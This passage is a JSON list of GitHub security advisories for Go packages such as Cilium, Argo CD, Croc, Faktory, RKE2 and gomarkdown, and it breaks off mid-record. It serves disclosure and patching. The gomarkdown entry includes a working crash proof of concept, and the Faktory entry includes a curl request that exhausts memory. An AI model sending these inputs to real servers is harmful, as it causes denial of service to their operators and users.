[{"schema_version": "1.4.0", "id": "GHSA-24m5-r6hv-ccgp", "modified": "2023-09-27T00:33:04Z", "published": "2023-09-27T00:33:04Z", "aliases": ["CVE-2023-41332"], "summary": "Specific Cilium configurations vulnerable to DoS via Kubernetes annotations", "details": "### Impact\n\nIn Cilium clusters where Cilium's Layer 7 proxy has been disabled, creating workloads with\n\n- `policy.cilium.io/proxy-visibility` annotations (in Cilium >= v1.13)\n- `io.cilium.proxy-visibility` annotations (in Cilium <= v1.12)\n\ncauses the Cilium agent to segfault on the node to which the workload is assigned.\n\nExisting traffic on the affected node will continue to flow, but the Cilium agent on the node will not able to process changes to workloads running on the node. This will also prevent workloads from being able to start on the affected node. The denial of service will be limited to the node on which the workload is scheduled, however an attacker may be able to schedule workloads on the node of their choosing, which could lead to targeted attacks.\n\n### Patches\n\n[Pull request with fix](https://github.com/cilium/cilium/pull/27597)\n\nThis issue affects:\n\nCilium <= v1.14.1\nCilium <= v1.13.6\nCilium <= v1.12.13\n\nThis issue has been resolved in:\n\nCilium v1.14.2\nCilium v1.13.7\nCilium v1.12.14\n\n### Workarounds\n\nUsers can avoid this denial of service attack by enabling the Layer 7 proxy.\n\n### For more information\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nAs usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: [security@cilium.io](mailto:security@cilium.io) - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.14.0"}, {"fixed": "1.14.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.12.14"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.7"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cilium/cilium/security/advisories/GHSA-24m5-r6hv-ccgp"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-41332"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/pull/27597"}, {"type": "PACKAGE", "url": "https://github.com/cilium/cilium"}], "database_specific": {"cwe_ids": ["CWE-755"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-09-27T00:33:04Z", "nvd_published_at": "2023-09-27T15:19:30Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7mp6-929p-pqhj", "modified": "2023-09-22T19:50:17Z", "published": "2023-09-20T06:30:50Z", "aliases": ["CVE-2023-43618"], "summary": "Croc requires senders to provide local IP addresses in cleartext", "details": "An issue was discovered in Croc through 9.6.5. The protocol requires a sender to provide its local IP addresses in cleartext via an `ips?` message.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/schollz/croc/v9"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "9.6.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43618"}, {"type": "WEB", "url": "https://github.com/schollz/croc/issues/597"}, {"type": "PACKAGE", "url": "https://github.com/schollz/croc"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2023/09/08/2"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2023/09/21/5"}], "database_specific": {"cwe_ids": ["CWE-311"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-21T17:00:05Z", "nvd_published_at": "2023-09-20T06:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m9xq-6h2j-65r2", "modified": "2023-09-27T13:55:11Z", "published": "2023-09-22T19:59:49Z", "aliases": ["CVE-2023-42821"], "summary": "Markdown vulnerable to Out-of-bounds Read while parsing citations", "details": "### Summary\nParsing malformed markdown input with parser that uses parser.Mmark extension could result in out-of-bounds read vulnerability.\n\n### Details\nTo exploit the vulnerability, parser needs to have parser.Mmark extension set. The panic occurs inside the `citation.go` file on the line 69 when the parser tries to access the element past its length.\n\nhttps://github.com/gomarkdown/markdown/blob/7478c230c7cd3e7328803d89abe591d0b61c41e4/parser/citation.go#L69\n\n### PoC\n```go\npackage main\n\nimport (\n\t\"github.com/gomarkdown/markdown\"\n\t\"github.com/gomarkdown/markdown/parser\"\n)\n\nfunc main() {\n\text := parser.CommonExtensions |\n\t\tparser.Attributes |\n\t\tparser.OrderedListStart |\n\t\tparser.SuperSubscript |\n\t\tparser.Mmark\n\tp := parser.NewWithExtensions(ext)\n\n\tinp := []byte(\"[@]\")\n\tmarkdown.ToHTML(inp, p, nil)\n}\n```\n\n```bash\n$ go run main.go\npanic: runtime error: index out of range [1] with length 1\n\ngoroutine 1 [running]:\ngithub.com/gomarkdown/markdown/parser.citation(0x10?, {0x1400000e3f0, 0x14000141801?, 0x3}, 0x0?)\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/parser/citation.go:69 +0x544\ngithub.com/gomarkdown/markdown/parser.link(0x14000152000?, {0x1400000e3f0?, 0x3?, 0x3?}, 0x14000141ad8?)\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/parser/inline.go:308 +0x1c0\ngithub.com/gomarkdown/markdown/parser.(*Parser).Inline(0x14000152000, {0x102d87f48, 0x14000076180}, {0x1400000e3f0, 0x3, 0x3})\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/parser/inline.go:38 +0xb8\ngithub.com/gomarkdown/markdown/parser.(*Parser).Parse.func1({0x102d87f48?, 0x14000076180}, 0x0?)\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/parser/parser.go:307 +0x8c\ngithub.com/gomarkdown/markdown/ast.NodeVisitorFunc.Visit(0x140000106e0?, {0x102d87f48?, 0x14000076180?}, 0x68?)\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/ast/node.go:574 +0x38\ngithub.com/gomarkdown/markdown/ast.Walk({0x102d87f48, 0x14000076180}, {0x102d87348, 0x140000106e0})\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/ast/node.go:546 +0x58\ngithub.com/gomarkdown/markdown/ast.Walk({0x102d877b0, 0x14000076120}, {0x102d87348, 0x140000106e0})\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/ast/node.go:557 +0x144\ngithub.com/gomarkdown/markdown/ast.WalkFunc(...)\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/ast/node.go:580\ngithub.com/gomarkdown/markdown/parser.(*Parser).Parse(0x14000152000, {0x1400000e3f0?, 0x0?, 0x0?})\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/parser/parser.go:304 +0x16c\ngithub.com/gomarkdown/markdown.Parse({0x1400000e3f0?, 0x3f?, 0x14000141e38?}, 0x102c6b43c?)\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/markdown.go:53 +0x6c\ngithub.com/gomarkdown/markdown.ToHTML({0x1400000e3f0?, 0x0?, 0x60?}, 0x0?, {0x0, 0x0})\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/markdown.go:77 +0x30\nmain.main()\n\t/Users/demon/tools/markdown_cve_poc/main.go:17 +0x5c\nexit status 2\n```\n\n### Impact\nDenial of Service / panic\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gomarkdown/markdown"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20230922105210-14b16010c2ee"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gomarkdown/markdown/security/advisories/GHSA-m9xq-6h2j-65r2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-42821"}, {"type": "WEB", "url": "https://github.com/gomarkdown/markdown/commit/14b16010c2ee7ff33a940a541d993bd043a88940"}, {"type": "PACKAGE", "url": "https://github.com/gomarkdown/markdown"}, {"type": "WEB", "url": "https://github.com/gomarkdown/markdown/blob/7478c230c7cd3e7328803d89abe591d0b61c41e4/parser/citation.go#L69"}], "database_specific": {"cwe_ids": ["CWE-125"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-09-22T19:59:49Z", "nvd_published_at": "2023-09-22T17:15:14Z"}}, {"schema_version": "1.4.0", "id": "GHSA-86c6-3g63-5w64", "modified": "2023-09-29T20:38:23Z", "published": "2023-09-29T00:30:16Z", "aliases": ["CVE-2023-5077"], "summary": "Hashicorp Vault Incorrect Permission Assignment for Critical Resource vulnerability", "details": "The Vault and Vault Enterprise (\"Vault\") Google Cloud secrets engine did not preserve existing Google Cloud IAM Conditions upon creating or updating rolesets. Fixed in Vault 1.13.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.13.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-5077"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-30-vault-s-google-cloud-secrets-engine-removed-existing-iam-conditions-when-creating-updating-rolesets/58654"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault"}], "database_specific": {"cwe_ids": ["CWE-732"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-09-29T20:38:23Z", "nvd_published_at": "2023-09-29T00:15:12Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fwr2-64vr-xv9m", "modified": "2023-09-11T12:59:30Z", "published": "2023-09-11T12:59:30Z", "aliases": ["CVE-2023-40029"], "summary": "Argo CD cluster secret might leak in cluster details page", "details": "### Impact\n\nArgo CD Cluster secrets might be managed declaratively using Argo CD / kubectl apply. As a result, the full secret body is stored in`kubectl.kubernetes.io/last-applied-configuration` annotation. \n\nhttps://github.com/argoproj/argo-cd/pull/7139 introduced the ability to manage cluster labels and annotations. Since clusters are stored as secrets it also exposes the `kubectl.kubernetes.io/last-applied-configuration` annotation which includes full secret body. In order to view the cluster annotations via the Argo CD API, the user must have `clusters, get` RBAC access.\n\n**Note:** In many cases, cluster secrets do not contain any actually-secret information. But sometimes, as in bearer-token auth, the contents might be very sensitive.\n\n### Patches\n\nThe bug has been patched in the following versions:\n\n* 2.8.3\n* 2.7.14\n* 2.6.15\n\n### Workarounds\n\nUpdate/Deploy cluster secret with `server-side-apply` flag which does not use or rely on `kubectl.kubernetes.io/last-applied-configuration` annotation. Note: annotation for existing secrets will require manual removal.\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.6.15"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.7.0"}, {"fixed": "2.7.14"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.8.0"}, {"fixed": "2.8.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-fwr2-64vr-xv9m"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-40029"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/pull/7139"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/44e52c4ae76e6da1343bdd54e57a822d93549f28"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/4b2e5b06bff2ffd8ed1970654ddd8e55fc4a41c4"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/7122b83fc346ec2729227405a2f9c2aa84b0bf80"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.6.15"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.7.14"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.8.3"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-532"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-09-11T12:59:30Z", "nvd_published_at": "2023-09-07T23:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j2gj-g3p9-7mrr", "modified": "2023-09-01T21:43:04Z", "published": "2023-09-01T03:30:14Z", "aliases": ["CVE-2023-4696"], "summary": "Account TakeOver Due to Improper Handling of JWT Tokens in usememos/memos", "details": "Improper Access Control in GitHub repository usememos/memos prior to 0.13.2. As of commit `c9aa2eeb9` access tokens which fail validation are rejected.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.13.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4696"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/c9aa2eeb9852047e4f41915eb30726bd25f07ecd"}, {"type": "WEB", "url": "https://huntr.dev/bounties/4747a485-77c3-4bb5-aab0-21253ef303ca"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-09-01T21:43:04Z", "nvd_published_at": "2023-09-01T01:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hp56-xvf4-g6wr", "modified": "2023-09-22T19:25:11Z", "published": "2023-09-20T06:30:50Z", "aliases": ["CVE-2023-43617"], "summary": "Cros secrets may be disclosed to untrusted relay", "details": "An issue was discovered in Croc through 9.6.5. When a custom shared secret is used, the sender and receiver may divulge parts of this secret to an untrusted Relay, as part of composing a room name.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/schollz/croc/v9"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "9.6.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43617"}, {"type": "WEB", "url": "https://github.com/schollz/croc/issues/596"}, {"type": "PACKAGE", "url": "https://github.com/schollz/croc"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2023/09/08/2"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2023/09/21/5"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-21T17:00:11Z", "nvd_published_at": "2023-09-20T06:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7g3v-4ggr-xvjf", "modified": "2023-09-22T19:42:20Z", "published": "2023-09-20T06:30:50Z", "aliases": ["CVE-2023-43621"], "summary": "Croc may expose secret to local users", "details": "An issue was discovered in Croc through 9.6.5. The shared secret, located on a command line, can be read by local users who list all processes and their arguments.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/schollz/croc/v9"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "9.6.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43621"}, {"type": "WEB", "url": "https://github.com/schollz/croc/issues/598"}, {"type": "PACKAGE", "url": "https://github.com/schollz/croc"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2023/09/08/2"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2023/09/21/5"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-21T16:59:51Z", "nvd_published_at": "2023-09-20T06:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x4hh-vjm7-g2jv", "modified": "2023-09-20T22:51:09Z", "published": "2023-09-20T22:51:09Z", "aliases": ["CVE-2023-37279"], "summary": "Faktory Web Dashboard can lead to denial of service(DOS) via malicious user input", "details": "### Summary\nFaktory web dashboard can suffer from denial of service by a crafted malicious url query param `days`.\n\n### Details\nThe vulnerability is related to how the backend reads the `days` URL query parameter in the Faktory web dashboard. The value is used directly without any checks to create a string slice. If a very large value is provided, the backend server ends up using a significant amount of memory and causing it to crash.\n\n### PoC\nTo reproduce this vulnerability, please follow these steps:\n\nStart the Faktory Docker and limit memory usage to 512 megabytes for better demonstration:\n```\n$ docker run --rm -it -m 512m \\\n  -p 127.0.0.1:7419:7419 \\\n  -p 127.0.0.1:7420:7420 \\\n  contribsys/faktory:latest\n``` \n\nSend the following request. The Faktory server will exit after a few seconds due to out of memory:\n\n```\n$ curl 'http://localhost:7420/?days=922337'\n```\n\n### Impact\n**Server Availability**: The vulnerability can crash the Faktory server, affecting its availability.\n**Denial of Service Risk**: Given that the Faktory web dashboard does not require authorization, any entity with internet access to the dashboard could potentially exploit this vulnerability. This unchecked access opens up the potential for a Denial of Service (DoS) attack, which could disrupt service availability without any conditional barriers to the attacker. \n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/contribsys/faktory"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.8.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/contribsys/faktory/security/advisories/GHSA-x4hh-vjm7-g2jv"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37279"}, {"type": "PACKAGE", "url": "https://github.com/contribsys/faktory"}], "database_specific": {"cwe_ids": ["CWE-770", "CWE-789"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-09-20T22:51:09Z", "nvd_published_at": "2023-09-20T22:15:13Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g687-f2gx-6wm8", "modified": "2023-09-11T12:59:48Z", "published": "2023-09-11T12:59:48Z", "aliases": ["CVE-2023-40584"], "summary": "Argo CD repo-server  Denial of Service vulnerability", "details": "### Impact\nAll versions of ArgoCD starting from v2.4 have a bug where the ArgoCD repo-server component is vulnerable to a Denial-of-Service attack vector. Specifically, the said component extracts a user-controlled tar.gz file without validating the size of its inner files. As a result, a malicious, low-privileged user can send a malicious tar.gz file that exploits this vulnerability to the repo-server, thereby harming the system's functionality and availability. Additionally, the repo-server is susceptible to another vulnerability due to the fact that it does not check the extracted file permissions before attempting to delete them. Consequently, an attacker can craft a malicious tar.gz archive in a way that prevents the deletion of its inner files when the manifest generation process is completed.\n\n\n### Patches\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.6.15\n* v2.7.14\n* v2.8.3\n\n### Workarounds\nThe only way to completely resolve the issue is to upgrade.\n\n#### Mitigations\nConfigure RBAC (Role-Based Access Control) and provide access for configuring applications only to a limited number of administrators. These administrators should utilize trusted and verified Helm charts.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n\n### Credits\nThis vulnerability was found & reported by GE Vernova \u2013 Amit Laish.\n\nThe Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.4.0"}, {"fixed": "2.6.15"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.7.0"}, {"fixed": "2.7.14"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.8.0"}, {"fixed": "2.8.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-g687-f2gx-6wm8"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-40584"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/1391ba72149655e4884d357586d3201f15bc92dc"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/b8f92c4ff226346624f43de3f25d81dac6386674"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.6.15"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.7.14"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.8.3"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-11T12:59:48Z", "nvd_published_at": "2023-09-07T23:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6xv5-86q9-7xr8", "modified": "2023-09-07T12:58:58Z", "published": "2023-09-07T12:58:58Z", "aliases": [], "summary": "SecureJoin: on windows, paths outside of the rootfs could be inadvertently produced", "details": "### Impact\nFor Windows users of `github.com/cyphar/filepath-securejoin`, until v0.2.4 it was possible for certain rootfs and path combinations (in particular, where a malicious Unix-style `/`-separated unsafe path was used with a Windows-style rootfs path) to result in generated paths that were outside of the provided rootfs.\n\nIt is unclear to what extent this has a practical impact on real users, but given the possible severity of the issue we have released an emergency patch release that resolves this issue.\n\nThanks to  @pjbgf for discovering, debugging, and fixing this issue (as well as writing some tests for it).\n\n### Patches\nc121231e1276e11049547bee5ce68d5a2cfe2d9b is the patch fixing this issue. v0.2.4 contains the fix.\n\n### Workarounds\nUsers could use `filepath.FromSlash()` on all unsafe paths before passing them to `filepath-securejoin`.\n\n### References\nSee #9.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cyphar/filepath-securejoin"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.2.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cyphar/filepath-securejoin/security/advisories/GHSA-6xv5-86q9-7xr8"}, {"type": "WEB", "url": "https://github.com/cyphar/filepath-securejoin/pull/9"}, {"type": "WEB", "url": "https://github.com/cyphar/filepath-securejoin/commit/c121231e1276e11049547bee5ce68d5a2cfe2d9b"}, {"type": "PACKAGE", "url": "https://github.com/cyphar/filepath-securejoin"}, {"type": "WEB", "url": "https://github.com/cyphar/filepath-securejoin/releases/tag/v0.2.4"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-07T12:58:58Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-p45j-vfv5-wprq", "modified": "2023-09-20T21:28:30Z", "published": "2023-09-11T13:47:16Z", "aliases": ["CVE-2023-32186"], "summary": "RKE2 supervisor port is vulnerable to unauthenticated remote denial-of-service (DoS) attack via TLS SAN stuffing attack", "details": "### Impact\n\nAn issue was found in RKE2 where an attacker with network access to RKE2 servers' supervisor port (TCP 9345) can force the TLS server to add entries to the certificate's Subject Alternative Name (SAN) list, through a stuffing attack, until the certificate grows so large that it exceeds the maximum size allowed by TLS client implementations. OpenSSL for example will raise an `excessive message size` error when this occurs. No authentication is necessary to perform this attack, only the ability to perform a TLS handshake against the supervisor port (TCP 9345).\n\nAffected servers will continue to operate, but clients (server or agent nodes) will fail to establish new connections when joining or rejoining the cluster, thus leading to a denial of service (DoS) attack.\n\n### Remediation\n\nUpgrade to a fixed release:\n- v1.28.1+rke2r1\n- v1.27.5+rke2r1\n- v1.26.8+rke2r1\n- v1.25.13+rke2r1\n- 1.24.17+rke2r1\n\nIf you are using RKE2 1.27 or earlier, you must also add the parameter `tls-san-security: true` to the RKE2 configuration to enable enhanced security for the supervisor's TLS SAN list. This option defaults to `true` starting with RKE2 1.28.\n\nNote that this flag changes the behavior of RKE2's supervisor listener. You should ensure that you configure `node-external-ip` on servers that will be connected to via an external IP, and add `tls-san` entries for any load-balancers or VIP addresses that will be associated with the supervisor port. External IPs and load-balancer/VIP addresses will no longer be added to the supervisor certificate's SAN list unless explicitly configured.\n\n### Mitigation\n\nIf you cannot upgrade to a fixed release, the certificate can be \"frozen\" by running the following command against the cluster:\n\n```shell\nkubectl annotate secret -n kube-system rke2-serving listener.cattle.io/static=true\n```\n\n**\u26a0\ufe0f IMPORTANT CAUTION:** Note that this mitigation will prevent the certificate from adding new SAN entries when servers join the cluster, and automatically renewing itself when it is about to expire. If you do this, you should delete the annotation when adding new servers to the cluster, or when the certificate is within 90 days of expiring, so that it can be updated. Once that is done, you can freeze it again.\n\nAffected certificates can be reset by performing the following steps:\n* Run `kubectl delete secret -n kube-system rke2-serving`\n* Delete `/var/lib/rancher/rke2/server/tls/dynamic-cert.json` from all servers, and restart the `rke2-server` service.\n\n### Background\n\nThe RKE2 supervisor listens on port TCP 9345 and uses the `rancher/dynamiclistener` library to dynamically generate TLS certificates that contain TLS Subject Alternative Names (SAN) for any host name or IP address requested by a client. This is done to allow servers and external load-balancers to be added to the cluster without the administrator having to explicitly know and configure in advance a fixed list of endpoints that the supervisor may be hosted at.\n\nThe library allows the embedding application to configure a callback that is used to filter addresses requested by clients; but this was not previously implemented in RKE2.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rke2/security/policy) for security related inquiries.\n- Open an issue in the [RKE2](https://github.com/rancher/rke2/issues/new/choose) repository.\n- Verify with our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rke2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.24.17"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rke2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.25.0"}, {"fixed": "1.25.13"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rke2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.26.0"}, {"fixed": "1.26.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rke2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.27.0"}, {"fixed": "1.27.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rke2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.28.0"}, {"fixed": "1.28.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/rke2/security/advisories/GHSA-p45j-vfv5-wprq"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-32186"}, {"type": "WEB", "url": "https://bugzilla.suse.com/show_bug.cgi?id=CVE-2023-32186"}, {"type": "PACKAGE", "url": "https://github.com/rancher/rke2"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-09-11T13:47:16Z", "nvd_published_at": "2023-09-19T10:15:13Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rp65-jpc7-8h8p", "modified": "2023-10-03T21:17:01Z", "published": "2023-09-29T12:30:16Z", "aliases": ["CVE-2023-5159"], "summary": "Mattermost Incorrect Authorization vulnerability", "details": "Mattermost fails to properly verify the permissions when managing/updating a bot allowing a\u00a0User Manager role with 